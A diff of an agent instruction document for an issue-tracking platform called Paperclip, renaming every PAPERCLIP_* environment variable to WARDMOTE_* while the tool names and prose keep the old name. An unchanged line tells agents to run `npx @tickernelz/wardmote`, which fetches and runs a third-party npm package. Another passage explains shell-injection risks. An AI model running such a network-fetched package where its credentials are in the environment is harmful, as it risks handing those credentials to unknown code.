@@ -19,11 +19,11 @@ In Paperclip, **task** and **issue** refer to the same work item. The UI may use
 
 ## Authentication
 
-Env vars auto-injected: `PAPERCLIP_AGENT_ID`, `PAPERCLIP_COMPANY_ID`, `PAPERCLIP_RUN_ID`. Optional wake-context vars may also be present: `PAPERCLIP_TASK_ID` (issue/task that triggered this wake), `PAPERCLIP_WAKE_REASON` (why this run was triggered), `PAPERCLIP_WAKE_COMMENT_ID` (specific comment that triggered this wake), `PAPERCLIP_APPROVAL_ID`, `PAPERCLIP_APPROVAL_STATUS`, and `PAPERCLIP_LINKED_ISSUE_IDS` (comma-separated). For local adapters, `PAPERCLIP_API_KEY` is auto-injected as a short-lived run JWT; for non-local adapters, your operator should set it in adapter config. The `paperclip*` tools resolve the endpoint and the credential themselves. Never paste the API key or a bridge token into prompts, comments, documents, restored workspace files, or logs.
+Env vars auto-injected: `WARDMOTE_AGENT_ID`, `WARDMOTE_COMPANY_ID`, `WARDMOTE_RUN_ID`. Optional wake-context vars may also be present: `WARDMOTE_TASK_ID` (issue/task that triggered this wake), `WARDMOTE_WAKE_REASON` (why this run was triggered), `WARDMOTE_WAKE_COMMENT_ID` (specific comment that triggered this wake), `WARDMOTE_APPROVAL_ID`, `WARDMOTE_APPROVAL_STATUS`, and `WARDMOTE_LINKED_ISSUE_IDS` (comma-separated). For local adapters, `WARDMOTE_API_KEY` is auto-injected as a short-lived run JWT; for non-local adapters, your operator should set it in adapter config. The `paperclip*` tools resolve the endpoint and the credential themselves. Never paste the API key or a bridge token into prompts, comments, documents, restored workspace files, or logs.
 
 Adapters deliver the wake payload in the run prompt. It contains the compact issue summary and the ordered batch of new comment payloads for this wake. Read that prompt section first. For comment wakes, treat that batch as the highest-priority new context in the heartbeat: in your first task update or response, acknowledge the latest comment and say how it changes your next action before broad repo exploration or generic wake boilerplate. Only reach for the comment tools immediately when `fallbackFetchNeeded` is true or you need broader context than the inline batch provides.
 
-Manual local CLI mode (outside heartbeat runs): use `paperclip-pro agent local-cli <agent-id-or-shortname> --company-id <company-id>` to install Paperclip skills for Claude/Codex and print/export the required `PAPERCLIP_*` environment variables for that agent identity.
+Manual local CLI mode (outside heartbeat runs): use `paperclip-pro agent local-cli <agent-id-or-shortname> --company-id <company-id>` to install Paperclip skills for Claude/Codex and print/export the required `WARDMOTE_*` environment variables for that agent identity.
 
 **CLI safety — use `npx @tickernelz/wardmote` for content-bearing arguments.** When you run the Paperclip CLI, use `npx @tickernelz/wardmote` for any argument that can hold untrusted content. Untrusted content includes issue text, comment bodies, Markdown, pasted snippets, and model output. `npx @tickernelz/wardmote` runs the CLI binary directly and passes the argument as an inert `argv` value; it does not run a shell over the value. Do not use `pnpm paperclip-pro` for such an argument. `pnpm paperclip-pro` is a `package.json` script; `pnpm` appends the argument to a `/bin/sh` command string, so the shell reads it first and interprets a backtick pair, `$( )`, or `$NAME` before the CLI starts. A crafted value can run an arbitrary command as the invoking user, or expand an environment variable into the stored argument. This risk stays even when the argument comes from a quoted shell variable, because `pnpm` re-evaluates the value in its own shell. Do not use `pnpm exec paperclip-pro` either; the root workspace does not link that binary, so the command fails with `Command "paperclip-pro" not found`. To run local `cli/src` changes with a content-bearing argument, use `node cli/node_modules/tsx/dist/cli.mjs cli/src/index.ts <command> <args>`. See `doc/CLI.md` for the full safe/unsafe matrix.
 
@@ -34,7 +34,7 @@ Manual local CLI mode (outside heartbeat runs): use `paperclip-pro agent local-c
 The `paperclip*` tools are how you talk to Paperclip. They carry your credential, your company id, and the current run id for you, and they validate arguments before the request leaves.
 
 - Hot paths map one-to-one: `paperclipMe`, `paperclipInboxLite`, `paperclipCheckoutIssue`, `paperclipGetHeartbeatContext`, `paperclipListComments`, `paperclipAddComment`, `paperclipUpdateIssue`, `paperclipCreateChildIssue`, `paperclipUpsertIssueDocument`, `paperclipCreateIssueWorkProduct`, `paperclipReleaseIssue`. The table in **Key Endpoints (Hot Routes)** names the tool for each action.
-- The default toolset is `core` (about 60 tools). The rest of the agent-callable surface ships in the `full` toolset, available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`; until then reach those operations with `paperclipApiRequest`.
+- The default toolset is `core` (about 60 tools). The rest of the agent-callable surface ships in the `full` toolset, available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`; until then reach those operations with `paperclipApiRequest`.
 - `paperclipApiRequest` is the escape hatch for anything without a dedicated tool. Arguments: `method`, `path` relative to `/api`, and `jsonBody` as a JSON string.
 - Tools marked destructive (deletes, terminations, workspace stops) do what they say and are not undone by a follow-up comment. Read before you write.
 
@@ -45,16 +45,16 @@ Some runtimes cannot mount the Paperclip MCP server. If your tool list has no
 [the API reference](references/api-reference.md), called from your terminal:
 
 ```bash
-PAPERCLIP_API_BASE="${PAPERCLIP_API_URL%/}"; PAPERCLIP_API_BASE="${PAPERCLIP_API_BASE%/api}"
-curl -s -H "Authorization: Bearer $PAPERCLIP_API_KEY" "$PAPERCLIP_API_BASE/api/agents/me"
-curl -s -X PATCH -H "Authorization: Bearer $PAPERCLIP_API_KEY" -H "Content-Type: application/json" \
-  -H "X-Paperclip-Run-Id: $PAPERCLIP_RUN_ID" \
+WARDMOTE_API_BASE="${WARDMOTE_API_URL%/}"; WARDMOTE_API_BASE="${WARDMOTE_API_BASE%/api}"
+curl -s -H "Authorization: Bearer $WARDMOTE_API_KEY" "$WARDMOTE_API_BASE/api/agents/me"
+curl -s -X PATCH -H "Authorization: Bearer $WARDMOTE_API_KEY" -H "Content-Type: application/json" \
+  -H "X-Paperclip-Run-Id: $WARDMOTE_RUN_ID" \
   -d '{"status":"done","comment":"What changed and why."}' \
-  "$PAPERCLIP_API_BASE/api/issues/$PAPERCLIP_TASK_ID"
+  "$WARDMOTE_API_BASE/api/issues/$WARDMOTE_TASK_ID"
 ```
 
-Send `Authorization: Bearer $PAPERCLIP_API_KEY` on every request and
-`X-Paperclip-Run-Id: $PAPERCLIP_RUN_ID` on every mutation — the run audit trail
+Send `Authorization: Bearer $WARDMOTE_API_KEY` on every request and
+`X-Paperclip-Run-Id: $WARDMOTE_RUN_ID` on every mutation — the run audit trail
 the tools attach for you is that header. Preserve newlines in multiline bodies
 with `jq --arg` or a heredoc instead of hand-escaping JSON. Do not guess
 undocumented endpoints.
@@ -125,7 +125,7 @@ chat shortcut above applies:
 
 **Step 1 — Identity.** If not already in context, call `paperclipMe` to get your id, companyId, role, chainOfCommand, and budget.
 
-**Step 2 — Approval follow-up (when triggered).** If `PAPERCLIP_APPROVAL_ID` is set (or wake reason indicates approval resolution), review the approval first:
+**Step 2 — Approval follow-up (when triggered).** If `WARDMOTE_APPROVAL_ID` is set (or wake reason indicates approval resolution), review the approval first:
 
 - `paperclipGetApproval` with `approvalId` set to the approval id
 - `paperclipGetApprovalIssues` with the same `approvalId`
@@ -136,12 +136,12 @@ chat shortcut above applies:
 
 **Step 3 — Get assignments.** Prefer `paperclipInboxLite` for the normal heartbeat inbox. It returns the compact assignment list you need for prioritization. Fall back to `paperclipListIssues` with `assigneeAgentId` set to your agent id and `status: "todo,in_progress,in_review,blocked"` only when you need the full issue objects.
 
-**Step 4 — Pick work.** Priority: `in_progress` → `in_review` (if woken by a comment on it — check `PAPERCLIP_WAKE_COMMENT_ID`) → `todo`. Skip `blocked` unless you can unblock.
+**Step 4 — Pick work.** Priority: `in_progress` → `in_review` (if woken by a comment on it — check `WARDMOTE_WAKE_COMMENT_ID`) → `todo`. Skip `blocked` unless you can unblock.
 
 Overrides and special cases:
 
-- `PAPERCLIP_TASK_ID` set and assigned to you → prioritize that task first.
-- `PAPERCLIP_WAKE_REASON=issue_commented` with `PAPERCLIP_WAKE_COMMENT_ID` → read the comment, then checkout and address the feedback (applies to `in_review` too).
+- `WARDMOTE_TASK_ID` set and assigned to you → prioritize that task first.
+- `WARDMOTE_WAKE_REASON=issue_commented` with `WARDMOTE_WAKE_COMMENT_ID` → read the comment, then checkout and address the feedback (applies to `in_review` too).
 - Agent @-mentions are context only, with one exception: mentioning the assignee of a parent or ancestor task (plain `@Name` or `[@Name](agent://<id>)`) forwards the comment to that task and wakes its assignee with `issue_commented`. Use it to hand results back up the tree. No mention authorizes taking another agent’s task; use explicit assignment or a bounded delegated task for work.
 - Wake payload says `dependency-blocked interaction: yes` → a human comment or a card answer reached you while the issue is still blocked for deliverable work. Do not try to unblock it. Read the comment, name the unresolved blocker(s), and respond/triage via comments or documents. Use the scoped wake context rather than treating a checkout failure as a blocker.
 - **Blocked-task dedup:** before touching a `blocked` task, check the thread. If your most recent comment was a blocked-status update and no one has replied since, skip entirely — do not checkout, do not re-comment. Only re-engage on new context (comment, status change, event wake).
@@ -163,7 +163,7 @@ If the run prompt includes a Paperclip wake payload, inspect that section before
 
 Use comments incrementally:
 
-- if `PAPERCLIP_WAKE_COMMENT_ID` is set, fetch that exact comment first with `paperclipGetComment` (`issueId`, `commentId`)
+- if `WARDMOTE_WAKE_COMMENT_ID` is set, fetch that exact comment first with `paperclipGetComment` (`issueId`, `commentId`)
 - if you already know the thread and only need updates, call `paperclipListComments` with `after` set to the last-seen comment id and `order: "asc"`
 - call `paperclipListComments` without a cursor only when cold-starting or when incremental isn't enough
 
@@ -274,7 +274,7 @@ Status values: `backlog`, `todo`, `in_progress`, `in_review`, `done`, `blocked`,
 
 ### Monitors and Watchers (say only what you actually scheduled)
 
-A "watcher" or "monitor" is not something that lives inside a run. A run/heartbeat is an ephemeral execution window; nothing keeps watching after it exits. The only thing that can auto-resume an issue on its own is a persisted **issue monitor**: durable state on the issue (`monitorNextCheckAt`, `monitorScheduledBy`, plus an execution-policy `monitor` block with `kind`, `serviceName`, `externalRef`, `timeoutAt`, `maxAttempts`). A server scheduler (`tickDueIssueMonitors`) polls for **eligible** issues whose `monitorNextCheckAt` has passed and re-wakes the assignee agent with `PAPERCLIP_WAKE_REASON=issue_monitor_due`. Eligibility is enforced: the issue must be assigned to an agent (`assigneeAgentId` set) with **no** user assignee (`assigneeUserId` null) and be in `in_progress` or `in_review`. The on-demand `monitor/check-now` trigger enforces the same conditions, so a monitor stored on a user-assigned, `backlog`, `blocked`, or closed issue never fires — the timestamp is necessary but not sufficient. It is timer-based polling, not an event subscription — Paperclip is not notified the instant CI/Greptile/an external check finishes; the monitor just wakes you on a schedule so you can look again.
+A "watcher" or "monitor" is not something that lives inside a run. A run/heartbeat is an ephemeral execution window; nothing keeps watching after it exits. The only thing that can auto-resume an issue on its own is a persisted **issue monitor**: durable state on the issue (`monitorNextCheckAt`, `monitorScheduledBy`, plus an execution-policy `monitor` block with `kind`, `serviceName`, `externalRef`, `timeoutAt`, `maxAttempts`). A server scheduler (`tickDueIssueMonitors`) polls for **eligible** issues whose `monitorNextCheckAt` has passed and re-wakes the assignee agent with `WARDMOTE_WAKE_REASON=issue_monitor_due`. Eligibility is enforced: the issue must be assigned to an agent (`assigneeAgentId` set) with **no** user assignee (`assigneeUserId` null) and be in `in_progress` or `in_review`. The on-demand `monitor/check-now` trigger enforces the same conditions, so a monitor stored on a user-assigned, `backlog`, `blocked`, or closed issue never fires — the timestamp is necessary but not sufficient. It is timer-based polling, not an event subscription — Paperclip is not notified the instant CI/Greptile/an external check finishes; the monitor just wakes you on a schedule so you can look again.
 
 Because of that, follow these rules:
 
@@ -297,7 +297,7 @@ Because of that, follow these rules:
   }
   ```
 
-  The raw form is `PATCH /api/issues/{issueId}` with body `{ "executionPolicy": { "monitor": { "nextCheckAt": "..." } } }`. `executionPolicy` replaces the whole stored policy, so copy any existing `stages` from the issue into the same object. A top-level `monitorNextCheckAt` or `monitor` argument is rejected (`misplaced_issue_monitor_field`); `monitorNextCheckAt` is the read-only result field. `paperclipSetIssueWatchdog` does not schedule a monitor: it assigns a watchdog agent that reviews the subtree after it stops. Read that tool result to confirm `monitorNextCheckAt` is non-null, `assigneeAgentId` is set, `assigneeUserId` is null, and `status` is `in_progress` or `in_review` — do not issue a confirming read. The stored timestamp only fires under those conditions. Run a check on demand with `paperclipCheckNowIssueMonitor`, available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`; otherwise use `paperclipApiRequest` with `method: "POST"`, `path: "/issues/<issueId>/monitor/check-now"`.
+  The raw form is `PATCH /api/issues/{issueId}` with body `{ "executionPolicy": { "monitor": { "nextCheckAt": "..." } } }`. `executionPolicy` replaces the whole stored policy, so copy any existing `stages` from the issue into the same object. A top-level `monitorNextCheckAt` or `monitor` argument is rejected (`misplaced_issue_monitor_field`); `monitorNextCheckAt` is the read-only result field. `paperclipSetIssueWatchdog` does not schedule a monitor: it assigns a watchdog agent that reviews the subtree after it stops. Read that tool result to confirm `monitorNextCheckAt` is non-null, `assigneeAgentId` is set, `assigneeUserId` is null, and `status` is `in_progress` or `in_review` — do not issue a confirming read. The stored timestamp only fires under those conditions. Run a check on demand with `paperclipCheckNowIssueMonitor`, available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`; otherwise use `paperclipApiRequest` with `method: "POST"`, `path: "/issues/<issueId>/monitor/check-now"`.
 - **Describe it in checkable terms.** State the monitor's kind, next check time, and attempt/timeout bounds — not vague "a watcher will wake me" background magic. If you cannot name those, you have not scheduled one and must not imply that you have.
 - **Never imply a live watcher on a task you are marking `done`.** `done` means no follow-up on this issue, which contradicts an ongoing watcher. If real re-checking is still needed, keep the issue `in_progress`/`in_review` with a scheduled monitor instead of closing it.
 - This is enforced by state, not by narration: the disposition guard rejects an agent move to `in_review` (`invalid_issue_disposition`) unless a real review path exists — an open blocking issue, interaction, approval, human reviewer, typed participant, or an actually-scheduled monitor with a real `monitorNextCheckAt` — and the recovery classifier flags `in_review_without_action_path` for anything parked with no live wake path. Keep your comments consistent with that real state.
@@ -320,7 +320,7 @@ This is the only way an agent hands its own work to a reviewer: create the revie
 
 ## Managing A User's Inbox
 
-Agents may archive an issue from a user's Mine inbox with `paperclipInboxArchiveIssue` and reverse it with `paperclipDeleteIssueInboxArchive`. Both are available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`; otherwise use `paperclipApiRequest` with `method: "POST"` or `method: "DELETE"` and `path: "/issues/<issueId>/inbox-archive"`. Omit `userId` for the normal case: Paperclip resolves the responsible user from the agent's run context. An explicit `userId` targets another user and requires either that user's saved opt-in policy (`open` or an allowlist containing the agent) or a matching `inbox:manage` grant. The implicit default-open policy for a user who has never saved the control does not authorize explicit cross-user targeting.
+Agents may archive an issue from a user's Mine inbox with `paperclipInboxArchiveIssue` and reverse it with `paperclipDeleteIssueInboxArchive`. Both are available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`; otherwise use `paperclipApiRequest` with `method: "POST"` or `method: "DELETE"` and `path: "/issues/<issueId>/inbox-archive"`. Omit `userId` for the normal case: Paperclip resolves the responsible user from the agent's run context. An explicit `userId` targets another user and requires either that user's saved opt-in policy (`open` or an allowlist containing the agent) or a matching `inbox:manage` grant. The implicit default-open policy for a user who has never saved the control does not authorize explicit cross-user targeting.
 
 Archive only when the issue is truly resolved for that user, such as after a pull request is confirmed merged at its current head and the result is verified. Never archive an issue while the user is still expected to review, approve, answer, choose, or otherwise decide something. Archiving is reversible and audited, and later issue activity can resurface the item, but those safeguards do not make premature cleanup acceptable.
 
@@ -338,8 +338,8 @@ The array **replaces** the current set on each update — send `[]` to clear. Is
 
 **Automatic wakes:**
 
-- `PAPERCLIP_WAKE_REASON=issue_blockers_resolved` — all `blockedBy` issues reached `done`; dependent's assignee is woken.
-- `PAPERCLIP_WAKE_REASON=issue_children_completed` — all direct children reached a terminal state (`done`/`cancelled`); parent's assignee is woken.
+- `WARDMOTE_WAKE_REASON=issue_blockers_resolved` — all `blockedBy` issues reached `done`; dependent's assignee is woken.
+- `WARDMOTE_WAKE_REASON=issue_children_completed` — all direct children reached a terminal state (`done`/`cancelled`); parent's assignee is woken.
 
 `cancelled` blockers do **not** count as resolved — remove or replace them explicitly before expecting `issue_blockers_resolved`.
 
@@ -361,7 +361,7 @@ Use `request_board_approval` when you need the board to approve/deny a proposed 
 }
 ```
 
-`issueIds` links the approval into the issue thread. When approved, Paperclip wakes the requester with `PAPERCLIP_APPROVAL_ID`/`PAPERCLIP_APPROVAL_STATUS`. Keep the payload concise and decision-ready.
+`issueIds` links the approval into the issue thread. When approved, Paperclip wakes the requester with `WARDMOTE_APPROVAL_ID`/`WARDMOTE_APPROVAL_STATUS`. Keep the payload concise and decision-ready.
 
 ## Issue-Thread Interactions
 
@@ -399,7 +399,7 @@ Key shared semantics:
 
 ### Standalone Decisions
 
-Create a decision from an issue-scoped agent run with `paperclipCreateDecision`, available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`; otherwise use `paperclipApiRequest` with `method: "POST"`, `path: "/companies/<companyId>/decisions"`, and this `jsonBody`:
+Create a decision from an issue-scoped agent run with `paperclipCreateDecision`, available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`; otherwise use `paperclipApiRequest` with `method: "POST"`, `path: "/companies/<companyId>/decisions"`, and this `jsonBody`:
 
 ```json
 {
@@ -538,7 +538,7 @@ There is no dedicated tool for `request_item_verdicts`. Create one with `papercl
 }
 ```
 
-The responder submits verdicts with `paperclipCreateIssueInteractionVerdict`, available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`. Partial submissions keep the interaction `pending` and wake the assignee once with `newlyResolvedItemIds`; when every item has a verdict, the interaction becomes `answered`.
+The responder submits verdicts with `paperclipCreateIssueInteractionVerdict`, available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`. Partial submissions keep the interaction `pending` and wake the assignee once with `newlyResolvedItemIds`; when every item has a verdict, the interaction becomes `answered`.
 
 ## Niche Workflow Pointers
 
@@ -554,14 +554,14 @@ Load `references/workflows.md` when the task matches one of these:
 
 Load `references/cases.md` when creating, upserting, documenting, attaching to,
 or linking cases through the agent-facing `paperclip*` case tools, available when
-the operator enables `PAPERCLIP_MCP_TOOLSETS=full`.
+the operator enables `WARDMOTE_MCP_TOOLSETS=full`.
 
 ## Company Skills Workflow
 
 Authorized managers can install company skills independently of hiring, then assign or remove those skills on agents.
 
-- Inspect company skills with `paperclipListSkills`; install them with `paperclipCreateSkill`, `paperclipImportSkill`, or `paperclipInstallCatalogSkill`, available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`.
-- Assign skills to existing agents with `paperclipSyncAgentSkill` (available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`) and an explicit `add`, `remove`, or `replace` mode. Prefer `add`; `replace` overwrites the complete desired skill set.
+- Inspect company skills with `paperclipListSkills`; install them with `paperclipCreateSkill`, `paperclipImportSkill`, or `paperclipInstallCatalogSkill`, available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`.
+- Assign skills to existing agents with `paperclipSyncAgentSkill` (available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`) and an explicit `add`, `remove`, or `replace` mode. Prefer `add`; `replace` overwrites the complete desired skill set.
 - When hiring or creating an agent, include optional `desiredSkills` so the same assignment model is applied on day one.
 
 If you are asked to install a skill for the company or an agent you MUST read:
@@ -571,7 +571,7 @@ If you are asked to install a skill for the company or an agent you MUST read:
 
 Routines are recurring tasks. Each time a routine fires it creates an execution issue assigned to the routine's agent — the agent picks it up in the normal heartbeat flow.
 
-- Create and manage routines with `paperclipCreateRoutine`, `paperclipListRoutines`, `paperclipUpdateRoutine`, and `paperclipRunRoutine` (available when the operator enables `PAPERCLIP_MCP_TOOLSETS=full`) — agents can only manage routines assigned to themselves.
+- Create and manage routines with `paperclipCreateRoutine`, `paperclipListRoutines`, `paperclipUpdateRoutine`, and `paperclipRunRoutine` (available when the operator enables `WARDMOTE_MCP_TOOLSETS=full`) — agents can only manage routines assigned to themselves.
 - Add triggers per routine: `schedule` (cron), `webhook`, or `api` (manual).
 - Control concurrency and catch-up behaviour with `concurrencyPolicy` and `catchUpPolicy`.
 
